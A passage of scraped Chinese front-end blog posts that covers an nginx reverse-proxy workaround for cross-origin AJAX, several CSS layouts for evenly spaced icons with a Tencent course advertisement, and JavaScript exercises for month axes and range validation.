xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;742&quot; height=&quot;452&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<hr>\n<h3 class=\"heading\" data-id=\"heading-17\">步骤二：创建index.html发起AJAX请求</h3>\n<p>打开你善用的编辑器直接复制以下代码</p>\n<pre><code class=\"hljs js\" lang=\"js\">&lt;!DOCTYPE&gt;\n<span class=\"xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">html</span>&gt;</span>\n  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">meta</span> <span class=\"hljs-attr\">charset</span>=<span class=\"hljs-string\">\"UTF-8\"</span> /&gt;</span>\n  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">head</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">title</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">title</span>&gt;</span>\n  <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">head</span>&gt;</span>\n  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">body</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">body</span>&gt;</span>\n  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"https://code.jquery.com/jquery-3.0.0.min.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span>\n  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\">\n    $.ajax({\n      <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"post\"</span>,\n      <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"http://tieba.baidu.com/connectmanager/user/updateFlashInfo\"</span>,\n      <span class=\"hljs-attr\">data</span>: <span class=\"hljs-string\">'{\"appid\":\"tieba\",\"cuid\":\"73118464C47E43476FB3E50ACD8E32C9:FG:1\",\"connection_id\":\"\",\"lcs_ip\":\"10.46.235.62\",\"lcs_port\":\"8891\",\"lcs_fd\":\"10619\",\"device_type\":\"21\"}'</span>,\n      <span class=\"hljs-attr\">async</span>: <span class=\"hljs-literal\">true</span>,\n      <span class=\"hljs-attr\">success</span>: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">res</span>) </span>{\n        <span class=\"hljs-built_in\">document</span>.write(<span class=\"hljs-built_in\">JSON</span>.stringify(res))\n      }\n    })\n  </span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">html</span>&gt;</span>\n</span></code></pre><p>跑服务试试？（这里是从8020端口开启的服务器）</p>\n<p></p><figure><img alt=\"ajax请求\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/20/16071fde74a8e2f2?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"1225\" data-height=\"871\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;1225&quot; height=&quot;871&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>哇塞通啦，200诶！我啥都没操作只是写了个$.ajax就通了呀？通个毛......</p>\n<pre><code>以上console是标准的跨域error，就算返回200也会被浏览器自身给截掉，无论如何success都获取不到Response里的值\n</code></pre>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-18\">开始nginx反向代理（进阶）</h2>\n<p>这里就不讲正常情况下nginx如何配置了，百度很多。\n这里直接附上我的github，大家去下载并且我对以下代码进行<strong>JS配置讲述</strong></p>\n<p>（<strong>下载是非常必要的，因为在github上我内置了nginx</strong>）</p>\n<p>Github：https://github.com/gs3170981/nginx_quick</p>\n<hr>\n<h3 class=\"heading\" data-id=\"heading-19\">步骤一：配置server.js</h3>\n<p>1）下载完目录结构应该是这样的</p>\n<pre><code>这里我内置了nginx，开不开心。\n</code></pre>\n<p></p><figure><img alt=\"目录结构\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/20/16071fde66540179?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"293\" data-height=\"199\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;293&quot; height=&quot;199&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>2）打开server.js，里面大致内容是这样的</p>\n<p></p><figure><img alt=\"配置内容\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/20/16071fde6d3c5211?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"728\" data-height=\"390\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;728&quot; height=&quot;390&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>3）如果你了解过或曾经配过nginx，那你一定很鸡冻，没错，这里呈现的就是配置项，意味着以后管理配置文件只需要修改这儿就OK了，因为有注释我就不一一解释了。</p>\n<p><strong>注意'/'别写反了，不然会被转义报错</strong></p>\n<hr>\n<h3 class=\"heading\" data-id=\"heading-20\">步骤二：执行node命令</h3>\n<p>1）win+r 打开你的cmd，cd到nginx所在的目录（即是下载后所在的目录）执行</p>\n<blockquote>\n<p>node server</p>\n</blockquote>\n<p>如果cmd没报错的话，你的文件结构应该变成如此了</p>\n<p></p><figure><img alt=\"文件结构\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/20/16071fde6fd96c6c?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"342\" data-height=\"445\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;342&quot; height=&quot;445&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>2）那么请再执行</p>\n<blockquote>\n<p>nginx</p>\n</blockquote>\n<p>如果你除了关闭啥都点不了的话，说明开启成功了（老司机一般都不会这样用...嘿嘿，<strong>推荐到目录下双击执行</strong>）</p>\n<hr>\n<h3 class=\"heading\" data-id=\"heading-21\">步骤三：请求试试！</h3>\n<p>nginx是服务器，所以开启的port必须为js文件中设置的port</p>\n<pre><code>打开127.0.0.1:8016\n</code></pre>\n<p></p><figure><img alt=\"8016服务器\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/20/16071fde8fbb16e7?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"485\" data-height=\"225\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;485&quot; height=&quot;225&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>我擦，咋啥都没显示？不是js中都输出了吗？我们来看看控制台</p>\n<p></p><figure><img alt=\"请求\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/20/16071fde94898053?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"1209\" data-height=\"698\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;1209&quot; height=&quot;698&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>汗，还是跨域了，不过如果你是老手的话，应该已经意识到为什么开始要讲解下什么是正向/反向代理，因为还少一步</p>\n<hr>\n<h3 class=\"heading\" data-id=\"heading-22\">步骤四：最后再战！</h3>\n<p>打开index.html，修改一点点的代码</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">&lt;!DOCTYPE&gt;\n&lt;html&gt;\n  &lt;meta charset=<span class=\"hljs-string\">\"UTF-8\"</span> /&gt;\n  &lt;head&gt;\n    &lt;title&gt;&lt;/title&gt;\n  &lt;/head&gt;\n  &lt;body&gt;&lt;/body&gt;\n  &lt;script src=<span class=\"hljs-string\">\"https://code.jquery.com/jquery-3.0.0.min.js\"</span>&gt;&lt;/script&gt;\n  &lt;script&gt;\n    $.ajax({\n      <span class=\"hljs-built_in\">type</span>: <span class=\"hljs-string\">\"post\"</span>,\n      url: <span class=\"hljs-string\">\"connectmanager/user/updateFlashInfo\"</span>, // 注意这里改成了相对路径\n      data: <span class=\"hljs-string\">'{\"appid\":\"tieba\",\"cuid\":\"73118464C47E43476FB3E50ACD8E32C9:FG:1\",\"connection_id\":\"\",\"lcs_ip\":\"10.46.235.62\",\"lcs_port\":\"8891\",\"lcs_fd\":\"10619\",\"device_type\":\"21\"}'</span>,\n      async: <span class=\"hljs-literal\">true</span>,\n      success: <span class=\"hljs-keyword\">function</span> (res) {\n        document.write(JSON.stringify(res))\n      }\n    })\n  &lt;/script&gt;\n&lt;/html&gt;\n</code></pre><p>A、B是相互认识并在同一服务器上的，B代理了C，则相当于同在了一个地址下，所以需改成<strong>相对路径</strong></p>\n<p>好，保存刷新一下</p>\n<p></p><figure><img alt=\"再请求\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/20/16071fde65ed3c58?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"442\" data-height=\"163\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;442&quot; height=&quot;163&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>天啦噜，好像成功呢了，再看下请求</p>\n<p></p><figure><img alt=\"正确返回\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/20/16071fde7275c2be?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"827\" data-height=\"726\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;827&quot; height=&quot;726&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>没有报错，正确返回了呢！</p>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-23\">相关技术链接</h2>\n<p><strong>该文章运用到了node（fs模块）想多了解的，请移步下方链接查看</strong></p>\n<p>CSDN：http://blog.csdn.net/Mcky_Love/article/details/78679291</p>\n<p>掘金：https://juejin.im/post/5a28aead6fb9a0450c494bc6</p>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-24\">关于</h2>\n<p>make：o︻そ╆OVE▅▅▅▆▇◤（清一色天空）</p>\n<p>blog：http://blog.csdn.net/mcky_love</p>\n<p>github：https://github.com/gs3170981/nginx_quick（好用的话记得加星哦！）</p>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-25\">结束语</h2>\n<p>该功能的实现主归功于fs的文件创建便利，此项可用于多种批量文件/文件夹操作的环境，不单指向开发哦~</p>\n</div>"},{"title":"这个CSS问题屏幕前的你是否熟悉，然后懵逼，最后放弃","avatar":"https://user-gold-cdn.xitu.io/2017/12/1/16010520f6488c55?imageView2/1/w/100/h/100/q/85/format/webp/interlace/1","author":"腾讯课堂","create_time":"2017 年 12 月 21 日","tags":["CSS","前端"],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><p>本文作者：IMWeb·结一 原文出处：<a href=\"https://link.juejin.im?target=https%3A%2F%2Flink.juejin.im%2F%3Ftarget%3Dhttp%253A%252F%252Fimweb.io%252Ftopic%252F5a08a5c7ef79bc941c30d8dd\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">IMWeb社区</a> <b>未经同意，禁止转载</b><br></p><p>当决定写这篇博文时候，突然一道闪电从脑海劈过，于是临时决定将这个熟悉然后到懵逼最后到放弃的问题分为两部分。</p><p>闲话少说，直接上题：</p><p><img alt=\"icons\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/21/160780c000f43c0e?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"720\" data-height=\"194\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;720&quot; height=&quot;194&quot;&gt;&lt;/svg&gt;\"></p><p><b>要求如下：</b></p><ul><li><b>三个橙色圆的大小为60px，固定不变</b></li><li><b>所有间隙相等，也就是被三个橙色圆划分成的四个间距相等</b></li><li><b>应用在移动端，整个黄色为全屏宽度（所以这里图片的大小不是真实的大小，如iphone 5那就是320px，6就是375px，6s就是414px等等）</b></li><li><b>兼容安卓4.0以上（悄悄透露下安卓4.3- 属性calc不支持）</b></li><li><b>html &amp; css （no js）</b></li></ul><p><b><br></b></p><p><b>方法不唯一，</b><b>欢迎大家把自己解决方案分享到评论区</b><br></p><h3 data-id=\"heading-0\">答案分割线————</h3><h3 data-id=\"heading-1\">一、flex方法</h3><p><b>1、插入四个空标签，设置flex:1，这个可能是大家最先想到的。</b></p><pre class=\"hljs bash\"><code>&lt;ul class=<span class=\"hljs-string\">\"share-list\"</span>&gt;\n    &lt;li class=<span class=\"hljs-string\">\"gap\"</span>&gt;&lt;/li&gt;\n    &lt;li class=<span class=\"hljs-string\">\"share-item\"</span>&gt;&lt;/li&gt;\n    &lt;li class=<span class=\"hljs-string\">\"gap\"</span>&gt;&lt;/li&gt;\n    &lt;li class=<span class=\"hljs-string\">\"share-item\"</span>&gt;&lt;/li&gt;\n    &lt;li class=<span class=\"hljs-string\">\"gap\"</span>&gt;&lt;/li&gt;\n    &lt;li class=<span class=\"hljs-string\">\"share-item\"</span>&gt;&lt;/li&gt;\n    &lt;li class=<span class=\"hljs-string\">\"gap\"</span>&gt;&lt;/li&gt;\n&lt;/ul&gt;\n</code></pre><pre class=\"hljs bash\"><code>.share-list{\n    display: flex;\n}\n.share-item{\n    width: 60px;\n    height: 60px;\n}\n.gap{\n    flex: 1;\n    width: 1%;\n}\n</code></pre><p><b>2、第一个和第三个设置flex为1，第二个为icon的固定宽度；内嵌一层处理具体的icon宽度</b></p><pre class=\"hljs bash\"><code>&lt;ul class=<span class=\"hljs-string\">\"share-list\"</span>&gt;\n    &lt;li class=<span class=\"hljs-string\">\"share-item\"</span>&gt;&lt;div class=<span class=\"hljs-string\">\"item-inner\"</span>&gt;&lt;/div&gt;&lt;/li&gt;\n    &lt;li class=<span class=\"hljs-string\">\"share-item\"</span>&gt;&lt;div class=<span class=\"hljs-string\">\"item-inner\"</span>&gt;&lt;/div&gt;&lt;/li&gt;\n    &lt;li class=<span class=\"hljs-string\">\"share-item\"</span>&gt;&lt;div class=<span class=\"hljs-string\">\"item-inner\"</span>&gt;&lt;/div&gt;&lt;/li&gt;\n&lt;/ul&gt;\n</code></pre><pre class=\"hljs bash\"><code>.share-list{\n    display: flex;\n}\n.share-item:nth-child(1),\n.share-item:nth-child(3){\n    flex: 1;\n    width: 1%;\n}\n.share-item:nth-child(2){\n    width: 60px;\n}\n.item-inner{\n    width: 60px;\n    margin-left: auto;\n    margin-right: auto;\n}\n</code></pre><p><b>3、对</b><code><b>justify-content: space-between;</b></code><b>进行变通</b></p><p><code>每个间隙的宽度 = （100% - 60px * 3）/ 4 = 25% - 45px</code></p><p>先外套一层wrap，设置左右的padding各位25%，再对list设置负的左右margin各位45px（相当于左右的padding减少了45px），得到第一个和最后一个间隙；中间的间隙通过<code>justify-content: space-between;</code>自由分配</p><pre class=\"hljs bash\"><code>&lt;div class=<span class=\"hljs-string\">\"share-list-wrap\"</span>&gt;\n  &lt;ul class=<span class=\"hljs-string\">\"share-list\"</span>&gt;\n      &lt;li class=<span class=\"hljs-string\">\"share-item\"</span>&gt;&lt;/li&gt;\n      &lt;li class=<span class=\"hljs-string\">\"share-item\"</span>&gt;&lt;/li&gt;\n      &lt;li class=<span class=\"hljs-string\">\"share-item\"</span>&gt;&lt;/li&gt;\n  &lt;/ul&gt;\n&lt;/div&gt;\n</code></pre><pre class=\"hljs bash\"><code>share-list-wrap{\n    padding-left: 25%;\n    padding-right: 25%;\n}\n.share-list{\n    display: flex;\n    margin-left: -45px;\n    margin-right: -45px;\n    justify-content: space-between;\n}\n</code></pre><p><b>4、高级</b><code><b>justify-content: space-between;</b></code><b>法</b></p><p>直接使用list的before和after伪元素参与布局</p><pre class=\"hljs bash\"><code>  &lt;ul class=<span class=\"hljs-string\">\"share-list\"</span>&gt;\n      &lt;li class=<span class=\"hljs-string\">\"share-item\"</span>&gt;&lt;/li&gt;\n      &lt;li class=<span class=\"hljs-string\">\"share-item\"</span>&gt;&lt;/li&gt;\n      &lt;li class=<span class=\"hljs-string\">\"share-item\"</span>&gt;&lt;/li&gt;\n  &lt;/ul&gt;\n</code></pre><pre class=\"hljs bash\"><code>.share-list{\n    display: flex;\n    justify-content: space-between;\n}\n.share-list:before,\n.share-list:after{\n    content: <span class=\"hljs-string\">\"\"</span>;\n}\n.share-item{\n    width: 60px;\n    height: 60px;\n}</code></pre><h3 data-id=\"heading-2\">二、绝对定位</h3><p>计算各个位置，第一个位置为25% - 60px</p><div>75%，第二个为50% - 60px </div><p>50%，第三个位置为75% - 60px*25%</p><p></p><p>这里就不再多讲，根据上面的间隙宽度计算公式总会算出来的，可能一开始想错了，调整下就对了。</p><p>最终的计算公式为：（假设n为间隙数，w为图标的宽度）</p><p>第i图标的位置为: i/n (%) - w(n-i)/n (px)，结合left和transform表示就是</p><pre class=\"hljs bash\"><code>left: i/n*100%;\ntransform: translate( -(n-1)/n*100%,0);</code></pre><h3 data-id=\"heading-3\">三、float方法</h3><p>设置第二个为绝对定位在中间；第一个的宽度为50%，padding-right为30px，第二个的宽度为50%，padding-left为30px，然后里面居中</p><pre class=\"hljs bash\"><code>.share-item:nth-child(2){\n    position: absolute;\n    left: 50%;\n    transform: translate(-50%, 0);\n    width: 60px;\n}\n.share-item:nth-child(1),\n.share-item:nth-child(3){\n    <span class=\"hljs-built_in\">float</span>: left:\n    width: 100%;\n    text-align: center;\n    box-sizing: border-box;\n}\n.share-item:nth-child(1){\n    padding-right: 30px;\n}\n.share-item:nth-child(3){\n    padding-left: 30px;\n}\n.item-inner{\n    display: inline-block;\n    vertical-align: middle;\n}</code></pre><h3 data-id=\"heading-4\">四、table方法</h3><p>设置<code>table-layout:fixed</code>，第二个td为60px，那么第一个和第三个自动等分剩余的空间，然后再单元格居中即可</p><h2 data-id=\"heading-5\">总结</h2><p>这个问题，其实所有的人都能解答（请忽略有点哗众取宠的文章标题），只是答题运用的方法不同而已，有灵活的，有死板的，最关键的还是我们对遇到问题怎么对应上自己的知识库。</p><p>关键问题不是你实现不了，而是你选择的方案可能不是最优的，这就是css，你了解越多，你就会越接近那个最优的捷径。</p><p><b><br></b></p><p><b>关于这个题目</b><b>，</b><b>你的</b><b>CSS功力是否经得住考验呢</b><b>？</b></p><p>所以前端的路上，需要不断学习系统先进的前端知识，了解业界的顶尖标准，不断自我进步......不论是巩固基础还是进阶充电，都需要保持进步的驱动力！</p><p><br></p><p>说了这么多<img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/21/160780b6e3f87556?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"87\" data-height=\"86\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;87&quot; height=&quot;86&quot;&gt;&lt;/svg&gt;\">......那还不快加入<b>腾讯官方出品的NEXT学位课程</b>！</p><p><b><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/1/16011147ba47189e?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"640\" data-height=\"360\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;640&quot; height=&quot;360&quot;&gt;&lt;/svg&gt;\"></b></p><p><b>NEXT学位</b><b>的优势</b><b>？</b>腾讯课堂官方出品、技术总监设计、高级工程师教学、硅谷最新的教学工具、前端岗位的项目实战、专家1V1、直播课答疑、腾讯内推、专属就业通道...种种优势助你走向前端的人生巅峰！<img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/21/16078ca6cf649190?imageslim\" data-width=\"1280\" data-height=\"313\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;1280&quot; height=&quot;313&quot;&gt;&lt;/svg&gt;\"></p><p><b><a href=\"https://link.juejin.im?target=https%3A%2F%2Fke.qq.com%2Fnext%2Findex.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">动动手指点击官网了解NEXT学位</a></b></p><p><b>第四期招生马上截止，限定席位等你来抢</b><br></p><p><b>更多课程详情可扫描下方二维码咨询助教</b></p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/1/16011791ee721557?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"1280\" data-height=\"533\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;1280&quot; height=&quot;533&quot;&gt;&lt;/svg&gt;\"><br></p><p><br></p></div>"},{"title":"JavaScript 打怪升级 —— 把业务逻辑当练习题做","avatar":"https://user-gold-cdn.xitu.io/2017/7/18/64d82b70650d11ed806f611d929c7b1e?imageView2/1/w/100/h/100/q/85/format/webp/interlace/1","author":"守候i","create_time":"2017 年 12 月 20 日","tags":["JavaScript"],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><h2 data-id=\"heading-0\">1.前言</h2><p>开发项目和出没社区有一段时间了，会遇上一些比较有印象业务需求。这些业务需求，可能是自己开发项目遇上的，可能是在社区看到的业务需求，或者其他情况接触到的需求，但是这些业务需求的实现逻辑都值得一写。因为这些业务逻辑可以当做练习题一样，可以给大家练手。也希望大家从这些需求实现的逻辑里面可以能到javascript的相关知识，当然如果大家觉得代码需要怎样优化，或者有什么建议，更好的实现方案，觉得我哪里写错了，或者有觉得可以分享的需求，可以在评论提下！</p><h2 data-id=\"heading-1\">2.月份坐标轴</h2><p>这个需求是，看下图就懂了</p><p><img class=\"lazyload inited loaded\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/20/1607162f0a70617b?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"655\" data-height=\"72\" src=\"https://user-gold-cdn.xitu.io/2017/12/20/1607162f0a70617b?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\"></p><p><img class=\"lazyload inited loaded\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/20/1607162f394f1dc5?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"667\" data-height=\"87\" src=\"https://user-gold-cdn.xitu.io/2017/12/20/1607162f394f1dc5?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\"></p><p>实现方式其实很简单，我在代码打上注释，大家就懂了！</p><pre class=\"hljs bash\"><code>var _date=[],dateData=[<span class=\"hljs-string\">\"1月\"</span>,<span class=\"hljs-string\">\"2月\"</span>,<span class=\"hljs-string\">\"3月\"</span>,<span class=\"hljs-string\">\"4月\"</span>,<span class=\"hljs-string\">\"5月\"</span>,<span class=\"hljs-string\">\"6月\"</span>,<span class=\"hljs-string\">\"7月\"</span>,<span class=\"hljs-string\">\"8月\"</span>,<span class=\"hljs-string\">\"9月\"</span>,<span class=\"hljs-string\">\"10月\"</span>,<span class=\"hljs-string\">\"11月\"</span>,<span class=\"hljs-string\">\"12月\"</span>];\n//准备一个月份反转的数组\nvar dateDataRet=Object.assign([],dateData).reverse();\n//获取当前年份\nvar yearText=new Date().getFullYear();\n//获取当前月份  调试的时候，大家可以通过调整now调试  3月-now=2,12月now=11...\nvar now=new Date().getMonth();\n<span class=\"hljs-keyword\">for</span>(<span class=\"hljs-built_in\">let</span> i=0;i&lt;6;i++){\n    <span class=\"hljs-keyword\">if</span>(now-i&lt;0){\n        //如果now-i&lt;0，从dateDataRet里面拿数据，下标=|now-i|-1。\n        _date.push(yearText-1+<span class=\"hljs-string\">'年'</span>+dateDataRet[Math.abs(now-i)-1]);\n    }\n    <span class=\"hljs-keyword\">else</span>{\n        //从dateData里面拿数据，下标=now-i\n        _date.push(yearText+<span class=\"hljs-string\">'年'</span>+dateData[now-i]);\n    }\n\n}\n_date.reverse();</code></pre><p>可能大家看着会懵，直接看下面的循环图就懂了</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/20/1607163105ecfbb8?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"597\" data-height=\"279\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;597&quot; height=&quot;279&quot;&gt;&lt;/svg&gt;\"></p><h2 data-id=\"heading-2\">3.数值区间</h2><p>如下图，就是几个数值区间，而且会有一个最小值和最大值</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/20/1607162f4a2281ac?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"408\" data-height=\"114\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;408&quot; height=&quot;114&quot;&gt;&lt;/svg&gt;\"></p><pre class=\"hljs bash\"><code>var _min=5,_max=50;\n<span class=\"hljs-keyword\">function</span> checkArr(arr,min,max){\n    //排序\n    arr.sort(<span class=\"hljs-keyword\">function</span>(n1,n2){<span class=\"hljs-built_in\">return</span> n1.min-n2.min})\n    //遍历\n    <span class=\"hljs-keyword\">for</span>(var i=0;i&lt;arr.length;i++){\n        //区间的最小值不能大于等于区间最大值\n        <span class=\"hljs-keyword\">if</span>(arr[i].min&gt;=arr[i].max){\n            console.log(<span class=\"hljs-string\">'区间的最小值不能大于等于区间最大值'</span>);\n            <span class=\"hljs-built_in\">return</span>;\n        }\n        //区间的最小值不能小于默认最小值\n        <span class=\"hljs-keyword\">if</span>(arr[i].min&lt;min){\n            console.log(<span class=\"hljs-string\">'区间的最小值不能小于默认最小值'</span>);\n            <span class=\"hljs-built_in\">return</span>;\n        }\n                    \n        //区间的最大值不能大于默认最大值\n        <span class=\"hljs-keyword\">if</span>(arr[i].max&gt;max){\n            console.log(<span class=\"hljs-string\">'区间的最大值不能大于默认最大值'</span>);\n            <span class=\"hljs-built_in\">return</span>;\n        }\n        //元素对比，从第二个元素开始\n        <span class=\"hljs-keyword\">if</span>(i&gt;0){\n            //minInclude，maxInclude，为<span class=\"hljs-literal\">false</span>就是不包含，为<span class=\"hljs-literal\">true</span>就是包含\n            //{min:10,max:20,minInclude:<span class=\"hljs-literal\">false</span>,maxInclude:<span class=\"hljs-literal\">false</span>}\n            //等同于(10,20)\n            //{min:20,max:30,minInclude:<span class=\"hljs-literal\">true</span>,maxInclude:<span class=\"hljs-literal\">false</span>}\n            //等同于[20,30);\n            \n            //如果前一个的最大值和当前的最小值都是包含情况，那么当前区间的最小值一定要比前一个区间的最大值大1\n            <span class=\"hljs-keyword\">if</span>(arr[i].minInclude&amp;&amp;arr[i-1].maxInclude&amp;&amp;arr[i].min-arr[i-1].max!==1){\n                console.log(<span class=\"hljs-string\">'取值范围错误-当前区间的最小值和前一个区间的最大值都是包含情况，当前区间的最小值一定要比前一个区间的最大值大1'</span>);\n                   <span class=\"hljs-built_in\">return</span>;\n                \n            }\n            //如果前一个的最大值和当前的最小值。一个是包含，一个是不包含，那么当前区间的的最小值一定要等于上一个区间的最大值\n            <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>(arr[i].minInclude!==arr[i-1].maxInclude&amp;&amp;arr[i].min!==arr[i-1].max){\n                console.log(<span class=\"hljs-string\">'取值范围错误-当前区间的最小值和前一个区间的最大值其中一个是包含，一个是不包含情况，当前区间的最小值一定要等于前一个区间的最大值'</span>);\n                <span class=\"hljs-built_in\">return</span>;\n            }\n            //如果前一个的最大值和当前的最小值都是不包含，肯定不满足\n            <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>((!arr[i].minInclude)&amp;&amp;(!arr[i-1].maxInclude)){\n                console.log(<span class=\"hljs-string\">'取值范围错误-前一个的最大值和当前的最小值都是不包含情况，不满足收尾相连'</span>);\n                <span class=\"hljs-built_in\">return</span>;\n            }\n        }\n    }\n}\n\n</code></pre><p>测试用例</p><pre class=\"hljs bash\"><code>var arr1=[{min:10,max:20,minInclude:<span class=\"hljs-literal\">false</span>,maxInclude:<span 